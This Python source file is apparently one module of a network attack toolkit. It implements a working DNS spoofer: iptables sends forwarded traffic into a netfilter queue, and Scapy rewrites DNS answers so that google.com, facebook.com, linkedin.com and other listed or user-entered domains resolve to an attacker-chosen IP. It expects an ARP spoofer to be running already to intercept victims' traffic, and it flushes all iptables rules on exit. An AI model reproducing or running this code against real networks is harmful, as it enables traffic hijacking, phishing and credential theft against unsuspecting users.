import time
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style


import subprocess
import scapy.all
import netfilterqueue
import ipaddress


'''
https://www.thepythoncode.com/article/make-dns-spoof-python

'''

dns_hosts = [
    b"www.google.com",
    b"google.com.",
    b"www.facebook.com.",
    b"facebook.com.",
    b"kali.org.",
    b"www.kali.org.",
    b"bing.com.",
    b"linkedin.com.",
    b"www.linkedin.com."
    ]


ip = ""

def ipv4_check(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except:
        return False

def define_queue_iptable():
    #creating a queue to put packet in it until we dont modift these
    queue_number = "99"
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num",queue_number])
    #packet from the local machien will not go in this chain they will only go in the queue i they are comming from the remote computer
    # for testing his on local host uncommnet the beow two commands
    # subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",queue_number])
    # subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",queue_number])
    #binding the queue to the nerfilter queue
    queue = netfilterqueue.NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(99,process_packet)
        queue.run()
    except KeyboardInterrupt:
        reset_setting()
    except:
        pass

def reset_setting():
    print(f"{Fore.YELLOW}\n[*] Reseting Ip Tables [*]")
    subprocess.call(["iptables","--flush"])
    print(f"\n[+] Retuning to main menu...{Style.RESET_ALL}")


def process_packet(packet):
    try:
        # print(packet)
        # print(packet.get_payload())
        #convet the packet into scapy packet
        scapy_packet = scapy.all.IP(packet.get_payload())
        #print scapy packet
        #print(scapy_packet.show())
        #DNSRR is the response response record
        if (scapy_packet.haslayer(scapy.all.DNSRR)):
            #DNSQR = is the query record question record
            #extract the qname form the response
            query=scapy_packet[scapy.all.DNSQR].qname
            print("--------------------")
            print("[+] Intercept request for ====> " , query.decode())
            print(scapy_packet.summary())
            # if the qname is in our spoofing list modefy the packet
            if query in dns_hosts :
                print(f"{Fore.GREEN}[*]Spoofing URl For ",query.decode())
                print("[*] Before Modification")
                print(scapy_packet.summary())
                # craft new answer, to overriding the original
                # setting the rdata for the IP we want to redirect (spoofed)
                # rrname ==> is the domain that the ip address is target to 
                # rdata ==> is the ip address of the domain name of the target
                answer = scapy.all.DNSRR(rrname=query,rdata=ip)
                #overwrite the ans packet
                scapy_packet[scapy.all.DNS].an = answer
                #set the ancount = 1 its the no of answers that has been send for the dns question
                scapy_packet[scapy.all.DNS].ancount = 1
                
                #delete the len of the ip packet sccapy will recalculate it so the packet did'nt got corrupted
                del scapy_packet[scapy.all.IP].len 
                del scapy_packet[scapy.all.IP].chksum
                del scapy_packet[scapy.all.UDP].len
                del scapy_packet[scapy.all.UDP].chksum

                #change the scapy packet to the original packet with modification
                packet.set_payload(bytes(scapy_packet))
                
                print("[*] After Modification")
                print(f"{scapy_packet.summary()}{Style.RESET_ALL}")
                print("--------------------")
            #print(scapy_packet.show())
        #forward the packet to the client
        packet.accept()
        # else:
        #     print("packet is accepted no modification")
        #     packet.accept()
        #cut the internet connection of the sniffe packets
        #packet.drop()
    except KeyboardInterrupt:
        return

def redirect_data():
    while True:
        ip_redirect = input("[+] Please Enter the ip address where you want to redirect the target [-]  :  ")
        if ipv4_check(ip_redirect):
            global ip
            ip = ip_redirect
            break
        else:
            print(f"{Fore.RED}[*] Please enter a valid ip address [*]{Style.RESET_ALL}")

def add_host_in_list():
    URl = input("[+] Please Enter the url to spoof (seperate by blank) : ")
    URl = URl.split()
    for x in URl:
        temp = bytes( x + ".", 'utf-8')
        dns_hosts.append(temp)
    print(f"{Fore.GREEN}[*] Spoofing url ==> ")
    print(f"{Fore.BLUE}{dns_hosts}{Style.RESET_ALL}")

def main_dns():
    print(f"{Fore.BLUE}Welcome To DNS Spoofer{Style.RESET_ALL}")
    try:
        print(f"{Fore.YELLOW}[***] Please Start Arp Spoofer Before Using this Module [***] {Style.RESET_ALL}")
        redirect_data()
        add_host_in_list()
        print(f"{Fore.GREEN}[++] Intercepting requests .... [++]{Style.RESET_ALL}")
        #call the main program
        define_queue_iptable()
    except KeyboardInterrupt:
        reset_setting()
        time.sleep(3)
